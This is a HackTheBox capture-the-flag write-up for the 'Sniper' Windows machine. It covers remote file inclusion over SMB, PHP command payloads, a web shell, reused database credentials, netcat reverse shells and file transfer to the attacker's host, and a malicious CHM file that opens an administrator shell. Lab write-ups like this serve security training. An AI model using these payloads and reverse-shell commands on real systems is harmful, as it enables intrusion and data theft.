---
title: "HackTheBox Writeup: Sniper"
date: 2020-03-26T14:10:39+01:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

I really liked Sniper, I can't say I've ever seen the two attack vectors required for this challenge in any other HTB CTF and both were fun to exploit and take note of, since this is a fairly realistic challenge, my favorite kind.

The challenge begins with the exploitation of an RFI vulnerability that allows a web application to include a PHP page from another host, with that a web shell is opened and credentials for an account are found so a proper reverse shell is started. To escalate privileges a malicious CHM file is crafted and dropped on the box, where a scheduled task running as Administrator opens it giving us access to that account.

![img](/images/writeup-sniper/1.png)

---

## Enumeration

An nmap scan probing all ports for services and running all default NSE scripts only returns a few results, RPC, SMB, and HTTP:
 
```aaa
┌─[baud@parrot]─[~/HTB/sniper]
└──╼ $sudo nmap -sV -sC -p- -oA fullScan -T4 10.10.10.151
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 02:20 CET
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-26T09:25:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.42 seconds
```

SMB NULL sessions are not allowed so not much enumeration is possible with tools like enum4linux:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/sniper]
└──╼ $enum4linux 10.10.10.151 2>/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 26 02:40:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.151    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.151    |
 ============================================ 
Looking up status of 10.10.10.151
No reply from 10.10.10.151

 ===================================== 
|    Session Check on 10.10.10.151    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

The homepage of the web server does not contain anything useful other than a bunch of links to other pages:

![img](/images/writeup-sniper/2.png)

One of the pages is a blog with a few placeholder posts in it and two dropdown menus:

![img](/images/writeup-sniper/blog.png)

There's also a simple login portal:

![img](/images/writeup-sniper/3.png)

The portal allows to create an account via the registration.php page:

![img](/images/writeup-sniper/4.png)

Registering a new account and using it to login takes to an under construction page from where the only option is to log out:

![img](/images/writeup-sniper/5.png)

Back to the blog, the drop-down Language menu has a few links, each of which redirects to the same blog page but passing it an argument containing the name of a PHP page:

```aaa
http://10.10.10.151/blog/?lang=blog-en.php
```

Trivial LFI payloads on the parameter don't seem to work, these are the ones I've tried myself:

```aaa
http://10.10.10.151/blog/index.php --> loads properly
http://10.10.10.151/blog/?lang=blog-en.php --> loads properly
http://10.10.10.151/blog/blog-es.php --> loads properly
http://10.10.10.151/blog/?lang=././blog-en.php --> loads properly
http://10.10.10.151/blog/?lang=../index.php --> not found
http://10.10.10.151/blog/?lang=..../index.php --> not found
http://10.10.10.151/blog/?lang=.../index.php --> not found
http://10.10.10.151/blog/?lang=../blog/blog-en.php --> not found
http://10.10.10.151/blog/?lang=../../../../../index.php --> not found
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.php --> ..%2f..%2f..%2f..%2f..%2findex.php
```

---

## Exploitation: RFI via SMB

At this point I tried RFI as well, which is pretty rare but it never hurts to try. It turns out that the web application will not include any page that is passed to it via HTTP, but it will access pages located in shared folders via SMB:

```aaa
http://10.10.10.151/blog/?lang=\\10.10.14.144\sniper\hello.php
```

Result:

![img](/images/writeup-sniper/6.png)

Now we can execute any PHP code in the context of the vulnerable web application, for example we can demonstrare RCE with a simple "whoami":

```php
<?php
        echo "<pre>";
        system('whoami');
        echo "</pre>";
        die;
?>
```

Which returns in the page:

![img](/images/writeup-sniper/7.png)

We could keep doing this manually for each command, for example here's how to download files on the host:

```php
<?php
	$commands = "powershell -Command \"IWR http://10.10.14.144/nc.exe -OutFile ./nc.exe\"";
        echo "<pre>";
        system($commands);
        echo "</pre>";
        die;
?>
```

Although nc.exe is flagged as malicious and deleted by Defender. A Nishang reverse shell with download cradle does not work either, and it is easy to tell why with this payload:

```php
<?php
	$commands = "powershell -Command \"\$ExecutionContext.SessionState.LanguageMode\"";
        echo "<pre>";
        system($commands);
        echo "</pre>";
        die;
?>
```

The result is:

![img](/images/writeup-sniper/8.png)

So PowerShell's constrained language is also enabled, limiting the actions we can perform with it.

After getting tired of changing the payload manually every time I found a [web shell](https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php) that works out of the box without being destroyed by Defender:

![img](/images/writeup-sniper/9.png)

From here shell commands have to be escaped slightly, for example:

![img](/images/writeup-sniper/10.png)


---

## Privilege Escalation #1: Passwsord Reuse + PSSession

The user folder has an old version of the registration page but the most interesting part is the db.php file in the same directory, which has the database credentials in it:

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

At first I didn't mind it too much and started enumerating MySQL by creating PHP pages to query it for all its databases and tables but with no great results (the only thing I found was an MD5 hash for a "superuser" user which I could not crack).


After a little break and some thinking I forgot to check for one of the weaknesses I so often underestimate: password reuse. I found out the database password is basically Chris' account password, I verified this with smbclient by being able to list the shares with his account:

```aaa
baud@kali:~/HTB/sniper$ smbclient -U chris -L \\\\10.10.10.151
Enter WORKGROUP\chris's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

As established at the beginning, anonymous users are not allowed to list shares on the box, meaning the credentials are correct:

```aaa
User: chris
Pass: 36mEAhz/B8xQ~2VM
```

Still, Chris can't access the C$ share anyway:

```aaa
baud@kali:~/HTB/sniper$ smbclient -U chris \\\\10.10.10.151\\C$
Enter WORKGROUP\chris's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

With a set of working credentials and nowhere to use them I was forced to drop files on the box. My first try was with the nc-family of binaries, using this command:

```powershell
powershell -command iwr http://10.10.14.144/ncat.exe -outfile \"c:\users\all users\data\ncat.exe\""
```

But Defender is always ready to stop the fun by flagging the binaries. Here's what I tried downloading and what worked:

```aaa
nc --> flagged
ncat --> flagged
nc64 --> works!
```

After downloading nc64 on the box I can call it from the web shell to contact my own host with a reverse shell:

```aaa
"c:\users\all users\data\nc64.exe" -e cmd.exe 10.10.14.144 9999
```

And my listener receives a connection giving me a proper shell at last:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49737
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>
```

We can become Chris by starting a PSSession with his credentials, since PSSessions aren't blocked by the CLM. First we enter the PowerShell console:

```aaa
C:\inetpub\wwwroot\blog>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog>
```

Then we put the user's password in a variable as a SecureString:

```aaa
PS C:\inetpub\wwwroot\blog> $pw = ConvertTo-SecureString -String "36mEAhz/B8xQ~2VM" -AsPlainText -force
```

The password is used to create a PSCredential object together with the username:

```aaa
PS C:\inetpub\wwwroot\blog> $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\chris", $pw
```

Now the Enter-PSSession cmdlet can be used to start a PSSession using that PSCredential object, which makes us impersonate Chris:

```aaa
PS C:\inetpub\wwwroot\blog> Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Chris\Documents>
```

I downloaded nc64.exe again to get a proper reverse shell instead of the uncomfortable PSSession:

```aaa
[localhost]: PS C:\Users\Chris\Documents> Invoke-Command -ScriptBlock { IWR http://10.10.14.144/nc64.exe -outfile C:\Users\Chris\Documents\nc64.exe }
[localhost]: PS C:\Users\Chris\Documents> Invoke-Command -ScriptBlock { C:\Users\Chris\Documents\nc64.exe -e cmd.exe 10.10.14.144 9090 }
```

I could have easily used the already downloaded nc64 but for some reason I was having issues navigating folders inside the PSSession so it was more comfortable to have another nc64 in the . directory. The new incoming connection is caught and we have a shell as Chris:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49779
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Documents

02/28/2020  02:53 PM    <DIR>          .
02/28/2020  02:53 PM    <DIR>          ..
04/11/2019  06:04 AM               402 desktop.ini
04/11/2019  06:04 AM    <JUNCTION>     My Music [C:\Users\Chris\Music]
04/11/2019  06:04 AM    <JUNCTION>     My Pictures [C:\Users\Chris\Pictures]
04/11/2019  06:04 AM    <JUNCTION>     My Videos [C:\Users\Chris\Videos]
02/28/2020  02:53 PM            45,272 nc64.exe
               2 File(s)         45,674 bytes
               5 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris\Documents>
```

While the user flag is in Chris' desktop, his downloads folder contains an interesting instructions.chm file:

```aaa
C:\Users\Chris>dir /a downloads
dir /a downloads
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\downloads

04/11/2019  07:36 AM    <DIR>          .
04/11/2019  07:36 AM    <DIR>          ..
04/11/2019  06:04 AM               282 desktop.ini
04/11/2019  07:36 AM            10,462 instructions.chm
               2 File(s)         10,744 bytes
               2 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris>
```

CHM files are typically shipped witht a program, containing its official documentation. The file can be transfered to us for analysis via nc64:

```aaa
C:\Users\Chris\Downloads>..\Documents\nc64.exe -w 3 10.10.14.144 9191 < instructions.chm
```

And saved locally like this:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9191 > instructions.chm
listening on [any] 9191 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49810
baud@kali:~/HTB/sniper$ file instructions.chm 
instructions.chm: MS Windows HtmlHelp Data
```

This is what the file looks like:

![img](/images/writeup-sniper/11.png)

This shitty work Chris is talking about is mentioned in the note.txt file in C:\Docs, where we get to appreciate the relationship between this evil CEO and poor coder Chris:

```aaa
C:\Users\Chris\Downloads>dir /a c:\docs
dir /a c:\docs
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\docs

10/01/2019  12:04 PM    <DIR>          .
10/01/2019  12:04 PM    <DIR>          ..
04/11/2019  08:31 AM               285 note.txt
04/11/2019  08:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,930,002,432 bytes free

C:\Users\Chris\Downloads>more c:\docs\note.txt
more c:\docs\note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

C:\Users\Chris\Downloads>
```

I absolutely love the "PHP for dummies" pdf in the directory just to tease him further on his bad PHP skills. Anyway he mentions dropping the documentation in the Docs folder, probably in CHM format because the file from earlier was supposed to be the Android app documentation.

---

## Privilege Escalation #2: RCE With CHM File

It's obvious that we have to finish Chris' job and make a malicious CHM file that the Administrator will open at one point. 

Using [this](https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7) GitHub page as reference I started running a few tests locally after installing the HTML Help WorkShop on a Windows 10 box. I'm pretty sure there's a way to craft CHM files on Linux too but if I remember correctly it involves Wine and when I use Wine nothing works, so I went the Windows way.

This is the base code provided by GitHub:

```html
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
  <PARAM name="Command" value="ShortCut">
  <PARAM name="Button" value="Bitmap::shortcut">
  <PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe > nul && %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8000/test.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'>
  <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
  x.Click();
</SCRIPT>
```

Basically the code simulates a button that presses itself triggering the payload contained in Item1, which is far more complicated than it needs to be for this single challenge so I'll make it simpler.

After obtaining the a.html file contained in the original CHM found on the box by unpacking it with 7zip we can simply change the code to make it look like this:

```html
<html>
<body>
<h1>Sniper Android App Documentation</h1>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
  <PARAM name="Command" value="ShortCut">
  <PARAM name="Button" value="Bitmap::shortcut">
  <PARAM name="Item1" value=',cmd.exe,/c c:\users\chris\documents\nc64.exe -e cmd.exe 10.10.14.144 6666'>
  <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
  x.Click();
</SCRIPT>
<h2>Table of Contents</h2>

<p>Pff... This dumb CEO always makes me do all the shitty work. SMH!</p>
<p>I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.</p>
</body>
</html>
```

This reuses the nc64 binary dropped in Chris' folder to start yet another reverse shell. Create a new project in the HTML Help WorkShop with that code and compile it, then drop the output CHM file in C:\Docs and soon enough what I can only presume to be the CEO will open it giving us a shell as the Administrator:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49812
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\administrator

C:\Windows\system32>
```











